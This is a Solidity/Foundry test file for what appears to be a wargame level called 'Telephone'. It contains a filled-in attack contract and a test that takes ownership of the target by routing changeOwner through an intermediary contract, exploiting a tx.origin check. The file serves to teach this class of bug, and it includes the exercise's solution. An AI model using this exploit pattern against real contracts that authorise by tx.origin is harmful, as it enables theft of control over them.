// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Telephone} from "../src/Telephone.sol";

/// @dev Fill in `attack()` — make `tx.origin != msg.sender` inside Telephone.
contract AttackTelephone {
    Telephone public immutable target;

    constructor(Telephone _target) {
        target = _target;
    }

    function attack(address newOwner) public {
        // ========== YOUR ATTACK LOGIC HERE ==========
        // Hint: call target.changeOwner(newOwner) from THIS contract.
        // Then inside Telephone:
        //   msg.sender  == AttackTelephone (this)
        //   tx.origin   == the EOA that started the tx (attacker)
        // so tx.origin != msg.sender → ownership changes.
        target.changeOwner(newOwner);
        // ========== END ATTACK LOGIC ==========
    }
}

contract TelephoneTest is Test {
    Telephone public target;
    AttackTelephone public attackContract;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(deployer);
        target = new Telephone();
        vm.stopPrank();

        vm.startPrank(attacker);
        attackContract = new AttackTelephone(target);
        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition:
        //   attacker becomes owner
        //
        // Hints (look at Telephone.sol carefully):
        //   - changeOwner only works when tx.origin != msg.sender
        //   - Calling changeOwner() directly from your wallet FAILS
        //     (tx.origin == msg.sender == your EOA)
        //   - Calling via another contract SUCCEEDS
        //     (tx.origin == attacker EOA, msg.sender == attack contract)

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        attackContract.attack(attacker);
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertEq(target.owner(), attacker, "attacker should be owner");
    }
}
